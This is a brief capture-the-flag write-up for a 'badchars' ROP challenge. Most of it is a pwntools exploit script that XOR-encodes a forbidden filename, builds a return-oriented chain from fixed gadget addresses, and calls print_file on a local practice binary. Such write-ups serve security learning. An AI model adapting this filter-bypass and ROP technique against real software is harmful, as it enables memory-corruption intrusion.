![](img/badchars-1782099616968.webp)

the challenge check for every bytes of the input if there exist 'x', 'g', 'a' or '.', which meant we cant just do something like print_file(./flag.txt)

no bypass this, we can use xor, which coveniently exist as a gadget

![](img/badchars-1782100129000.webp)

the rest of the challenge is the same as [write4](write4.md)

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./badchars")

context.binary = exe
context.log_level = "debug"

script = '''
b*pwnme+267
c
'''

def main():
    # r = gdb.debug(exe.path, gdbscript=script)
    r = process(exe.path)

    pop_rdi=0x00000000004006a3
    pop_r12_pop_r13_pop_r14_pop_r15=0x000000000040069c
    movIr13I_r12=0x0000000000400634
    xorIr15I_r14b=0x0000000000400628
    buffer=b"A"*0x20

    payload=flat(
        buffer,
        0x601800,
        pop_r12_pop_r13_pop_r14_pop_r15,
        0x51575a5019,
        0x601800,
        0,
        0,
        movIr13I_r12,

        pop_r12_pop_r13_pop_r14_pop_r15,
        0,
        0,
        0x3636363636,
        0x601800,
        xorIr15I_r14b,
        pop_r12_pop_r13_pop_r14_pop_r15,
        0,
        0,
        0x3636363636,
        0x601801,
        xorIr15I_r14b,
        pop_r12_pop_r13_pop_r14_pop_r15,
        0,
        0,
        0x3636363636,
        0x601802,
        xorIr15I_r14b,
        pop_r12_pop_r13_pop_r14_pop_r15,
        0,
        0,
        0x3636363636,
        0x601803,
        xorIr15I_r14b,
        pop_r12_pop_r13_pop_r14_pop_r15,
        0,
        0,
        0x3636363636,
        0x601804,
        xorIr15I_r14b,

        pop_rdi,
        0x601800,
        exe.plt["print_file"]
    )

    time.sleep(0.1)
    r.send(payload)

    r.interactive()

if __name__ == "__main__":
    main()

```